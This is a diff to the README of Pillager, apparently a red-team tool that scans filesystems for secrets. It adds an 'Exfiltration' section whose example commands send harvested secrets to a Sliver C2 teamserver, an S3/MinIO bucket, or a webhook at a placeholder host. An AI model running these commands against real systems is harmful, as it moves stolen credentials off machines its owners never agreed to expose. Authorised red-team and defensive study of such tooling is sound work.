@@ -14,6 +14,7 @@ Pillage filesystems for sensitive information with Go.
 1. [Summary](#summary)
 1. [Installation](#installation)
 1. [Usage](#usage)
+1. [Exfiltration](#exfiltration)
 1. [Documentation](#documentation)
 
 ## Summary
@@ -73,6 +74,31 @@ pillager [cmd] --help
 Pillager provides a terminal user interface built with [bubbletea](https://github.com/charmbracelet/bubbletea) if you'd like to scan for secrets interactively.
 
 [![asciicast](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU.svg)](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU)
+
+## Exfiltration
+
+Send discovered secrets to remote destinations: **[Sliver C2](https://sliver.sh/)** (loot/credential stores), **S3/MinIO** (cloud storage), or **Webhooks** (custom HTTP endpoints).
+
+```bash
+# Sliver C2 - Send to teamserver with credential parsing
+pillager hunt /target --exfil sliver \
+  --sliver-config ~/.sliver-client/configs/operator.cfg
+
+# S3/MinIO - Upload with encryption
+pillager hunt /target --exfil s3 \
+  --s3-bucket red-team-findings \
+  --s3-endpoint https://minio.internal:9000 \
+  --exfil-encrypt env:EXFIL_KEY
+
+# Webhook - POST to custom endpoint
+pillager hunt /target --exfil webhook \
+  --webhook-url https://your-server.com/findings \
+  --webhook-header "Authorization: Bearer token"
+```
+
+**Security**: AES-256-GCM encryption (`--exfil-encrypt`), TLS by default, automatic metadata (hostname, timestamp)
+
+---
 
 ## Configuration
 
